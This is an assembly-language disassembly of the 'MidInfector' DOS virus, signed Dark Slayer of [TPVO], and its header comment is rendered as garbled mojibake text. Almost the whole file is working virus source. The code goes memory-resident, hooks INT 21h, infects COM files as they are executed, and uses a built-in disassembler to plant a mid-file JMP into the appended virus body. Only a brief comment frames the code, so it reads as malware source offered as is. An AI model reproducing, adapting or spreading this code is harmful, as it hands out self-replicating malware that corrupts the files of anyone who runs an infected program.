   ; comment *
   ;
   ;                         MidInfector virus disassembly
   ;
   ;
   ;  *¥§®¡¨¤ë¥ à¥§¨¤¥âë¥ ¢¨àãáë. *¥à¥å¢ âë¢ îâ INT 21h ¨ § ¯¨áë¢ îâáï ¢ ª®¥æ § ¯ãáª ¥¬ëå
   ;  COM-ä ©«®¢. "MidInfector.760,765" á®¤¥à¦ â áâà®ªã:
   ;
   ;  MidInfector by Dark Slayer of [TPVO]
   ;
   ;  *à¨ § à ¦¥¨¨ § ¯¨áë¢ îâ ª®¬ ¤ã "JMP VirusCode" ¢ á¥à¥¤¨ã ä ©« : áç¨âë¢ îâ ä ©« ¢
   ;  ¯ ¬ïâì, ¤¨§ áá¥¬¡«¨àãîâ ¥£® ª®¤ (¢¨àãáë á®¤¥à¦ â ¢ á¥¡¥ ¯à¨¬¨â¨¢ë© ¤¨§ áá¥¬¡«¥à) ¨
   ;  "¨¤ãâ" ¯® ª®¤ã ä ©«  ¤® â¥å ¯®à, ¯®ª  ¥  âªãâáï   ª®¬ ¤ã ¢ë§®¢  ¯à¥àë¢ ¨ï,
   ;  ãá«®¢ãî ¯¥à¥¤ çã ã¯à ¢«¥¨ï (Jcc), FAR JMP/CALL ¨ ¥ª®â®àë¥ ¤àã£¨¥. *® â®¬ã  ¤à¥áã,
   ;  £¤¥ ¯à®¨§®è«  ®áâ ®¢ª  ¤¨§ áá¥¬¡«¥à , ¢¨àãáë § ¯¨áë¢ îâ ª®¬ ¤ã JMP, ¯¥à¥¤ îéãî
   ;  ã¯à ¢«¥¨¥   â¥«® ¢¨àãá .
   ;
   ; *

   i21h_1          equ     84h
   i21h_2          equ     86h
   hadress         equ     66h
   hcode           equ     83h
   hcode2          equ     84h
   parame          equ     0C002h
   parame2         equ     0C024h

   mid     segment byte public
   assume  cs:mid, ds:mid
   org     100h
   midinf  proc    far
   start:                  ; start virus
   pushf                   ; push flags
   cld                     ; clear direction
   push ax
   push bx
   push cx
   push dx
   push si
   push di
   push bp
   push ds
   push es
   call delta_ofs

   delta_ofs:
   pop si
   sub si,offset delta_ofs
   push si
   mov ax,1888h            ; check for TSR
   int 21h
   cmp ax,4D49h            ; already resident?
   je rez                  ; equal? jump to rez
   mov ah,4Ah                      ; find top of memory
   mov bx,0FFFFh           ; (65536)
   int 21h
   mov ah,4Ah              ; resize enough para's
   sub bx,31h              ; for virus
   int 21h
   jc rez                  ; equal? jump to rez
   xor di,di
   sub word ptr [di+2],31h
   mov ax,ds
   dec ax                  ; ax - 1 = MCB
   mov ds,ax
   add ax,[di+3]           ;
   inc ax
   mov ds,ax
   or word ptr [di+1],8    ; DOS = MCB owner
   inc ax
   mov es,ax
   mov cx,2F8h
   rep movs byte ptr es:[di],cs:[si]
   mov ds,cx
   mov ax,2D1h
   xchg ds:i21h_1,ax
   stosw
   mov ax,es
   xchg ds:i21h_2,ax
   stosw
   rez:
   pop si
   add si,hcode
   push cs
   push cs
   pop ds
   pop es
   mov ax,0
   add ax,100h
   mov di,ax
   sub ax,si
   mov [si-2],ax
   jmp short $+2
   movsb
   movsw
   pop es
   pop ds
   pop bp
   pop di
   pop si
   pop dx
   pop cx
   pop bx
   pop ax
   popf     ; pop flags
   jmp xxx
   xxx:
   int 20h                 ; program terminate
   db 00h, 20h
   info db ' MidInfector by Dark Slayer of [TPVO]  '
   infect_file:
   mov si,dx
   cld                     ; clear direction
   zer:
   lodsb                   ; String [si] to al
   or al,al                ; Zero ?
   jnz zer                 ; Jump if not zero
   cmp byte ptr [si-5],'.'
   jne exit                ; Not equal? Jump to exit
   mov ax,[si-4]
   and ax,'OC'
   cmp ax,4F43h
   jne exit                ; Not equal? Jump to exit
   mov al,[si-2]
   and al,0DFh
   cmp al,'M'
   jne exit                ; Not equal? Jump to exit
   mov ah,48h              ; allocate memory
   mov bx,1000h
   int 21h
   jc exit                 ; Jump if carry Set
   push ax
   mov ax,3D02h            ; Open file (read/write)
   int 21h
   jc mez                  ; Jump if carry Set
   xchg bx,ax              ; BX = file handle
   pop ds
   push ds
   mov ah,3Fh              ; Read from file
   mov cx,0F000h
   cwd
   int 21h
   jc close_file           ; Error? Jump to close_file
   cmp ax,cx
   je close_file           ; Error? Jump to close_file
   xchg cx,ax
   xor si,si               ; Zero register
   mov ax,[si]
   xor al,ah
   cmp al,17h              ; MZ? - EXE file
   je close_file           ; Error? Jump to close_file
   push bx
   call sub_3
   pop bx
   push cx
   mov ax,4200h
   xor cx,cx               ; Zero register
   cwd
   int 21h
   pop cx
   mov ah,40h
   int 21h
   close_file:
   mov ah,3Eh              ; close file
   int 21h
   mez:
   mov ah,49h              ; allocate memory
   pop es
   int 21h
   exit:                   ; exit
   retn


   sub_3   proc    near
   diz:
   push si
   call sub_4
   push ax
   mov al,ah
   cbw
   shl ax,1
   xchg di,ax
   pop ax
   call word ptr cs:[29Ch][di]
   pop ax
   jc loc_8
   cmp si,cx
   jb diz
   loc_8:
   mov cs:hadress,ax
   xchg si,ax
   mov al,0E9h                     ; jump?
   xchg [si],al
   mov cs:hcode,al
   mov ax,cx
   sub ax,si
   sub ax,3
   xchg [si+1],ax
   mov cs:hcode2,ax
   mov di,cx
   push ds
   pop es
   xor si,si                       ; zero register
   mov cx,2F8h
   rep movs byte ptr es:[di],cs:[si]
   mov cx,di
   retn
   sub_3 endp

   sub_4 proc near
   fid:
   mov ah,3
   lodsb
   test al,0C4h                    ; add/adc/and/or/sbb/sub/xor/cmp reg,reg???
   jnz fid2
   mov ah,0
   retn
   fid2:
   test al,0C2h                    ; add/adc/and/or/sbb/sub/xor/cmp al/ax,xxxx???
   jnz fid3
   test al,4
   jz fid3
   mov ah,1
   retn
   fid3:
   test al,0E0h                    ; push/pop reg? segment
   jnz fid4
   push ax
   and al,6
   cmp al,6
   pop ax
   jnz fid4
   mov ah,2
   retn
   fid4:
   test al,0C1h                    ; ss/ds/es ??
   jnz fid5
   push ax
   and al,26h
   cmp al,26h
   pop ax
   jz ret_                         ; zero? jump ret
   fid5:
   cmp al,61h                      ; pushA/popA
   ja fid6
   mov ah,4
   ret_:
   retn
   fid6:
   cmp al,68h                      ; size? maybe
   jb ret_
   jnz fid7
   mov ah,4
   inc si
   inc si
   retn                            ;return
   fid7:
   cmp al,6Ah                      ; imul reg16/reg16 xxx???
   jae fid8
   mov ah,6
   retn
   fid8:
   jnz fid9
   mov ah,4
   inc si
   retn
   fid9:
   cmp al,6Bh                      ; imul reg16,reg16/mem,xx???
   jne fid10                       ; if not equal Jump fid10
   mov ah,5
   retn
   fid10:
   cmp al,80h                      ; jxx?
   jb ret_                         ; if belowJump
   jnz fid11                       ; if not zero Jump
   mov ah,5
   retn
   fid11:
   cmp al,81h
   jne fid12                       ; if not equal jump 12
   mov ah,6
   retn
   fid12:
   cmp al,83h
   ja fid13
   mov ah,5
   retn
   fid13:
   cmp al,8Dh
   jae fid14
   mov ah,0
   retn
   fid14:
   jz ret_
   cmp al,8Fh
   jae fid15
   mov ah,0
   retn
   fid15:
   jnz fid16
   mov ah,0
   retn
   fid16:
   cmp al,9Ah
   jae fid17
   mov ah,4
   retn
   fid17:
   jz ret_
   cmp al,0A0h
   jae fid18
   mov ah,4
   retn
   fid18:
   cmp al,0A8h
   jb ret_
   cmp al,0AAh
   jae fid19
   mov ah,1
   retn
   fid19:
   cmp al,0B0h
   jb ret_
   cmp al,0B8h
   jae fid20
   mov ah,4
   inc si
   retn
   fid20:
   cmp al,0C0h
   jae fid21
   mov ah,4
   inc si
   inc si
   retn
   fid21:
   cmp al,0C2h
   jae fid22
   mov ah,5
   loc_ret_31:
   retn
   fid22:
   cmp al,0CCh
   jb loc_ret_31
   jnz fid23
   mov ah,4
   retn
   fid23:
   cmp al,0CEh
   jb loc_ret_31
   jnz fid24
   mov ah,4
   retn
   fid24:
   cmp al,0D0h
   jb loc_ret_31
   cmp al,0D4h
   jae fid26
   mov ah,0
   retn
   fid26:
   cmp al,0E4h
   jb loc_ret_31
   cmp al,0E8h
   jae fid27
   mov ah,4
   inc si
   retn
   fid27:
   cmp al,0EAh
   jae fid28
   lodsw
   add si,ax
   mov ah,4
   retn
   fid28:
   jz loc_ret_31
   cmp al,0ECh
   jae fid29
   lodsb
   cbw
   add si,ax
   mov ah,4
   retn
   fid29:
   cmp al,0F0h
   jae fid30
   mov ah,4
   inc si
   retn
   fid30:
   jnz fid32
   fid31:
   jmp fid
   fid32:
   cmp al,0F2h
   jae fid33
   mov ah,4
   retn
   fid33:
   cmp al,0F4h
   jb fid31
   cmp al,0F6h
   jae fid34
   mov ah,4
   retn
   fid34:
   cmp al,0F8h
   jae fid38
   mov al,[si]
   push ax
   and al,38h
   cmp al,8
   jbe fid36
   cmp al,30h
   pop ax
   jc fid35
   retn
   fid35:
   mov ah,0
   retn
   fid36:
   pop ax
   test al,1
   jnz fid37
   mov ah,5
   retn
   fid37:
   mov ah,6
   retn
   fid38:
   cmp al,0FEh
   jae end_ret
   mov ah,4
   end_ret:
   retn
   sub_4 endp
   stosb
   add dh,[bp+di-45FEh]
   add dh,ds:parame[bx+di]
   add al,dl
   add cl,cl
   add ch,ds:parame2[si]
   cmp al,0C0h
   je ret3_                ; if equal jump ret3_
   stc
   ret3_:
   retn
   inc si
   test al,1
   jz ret4_
   inc si
   ret4_:
   retn
   cmp al,0Fh
   db 75h, 02h
   stc
   mov al,0F8h
   retn
   call sub_4
   db 0E8h,0E5h,0FFh
   jc loc_ret_52
   inc si
   loc_ret_52:
   retn
   call sub_4
   db 0E8h,0DEh,0FFh
   jc loc_ret_53
   inc si
   inc si
   loc_ret_53:
   retn
   pushf                   ; push flags
   cmp ax,1888h            ; check for TSR
   jne fun4b               ; not equal? jump to fun4b
   popf                    ; pop flags
   mov ax,4D49h
   iret                    ; interrupt return
   fun4b:
   cmp ax,4B00h
   jne exiti21             ; not equal? jump to exiti21
   push ax
   push bx
   push cx
   push dx
   push si
   push di
   push bp
   push ds
   push es
   call infect_file
   pop es
   pop ds
   pop bp
   pop di
   pop si
   pop dx
   pop cx
   pop bx
   pop ax
   exiti21:
   popf                    ; pop flags
   db  0eah
   dw  ?,?
   midinf endp
   mid ends
   end start
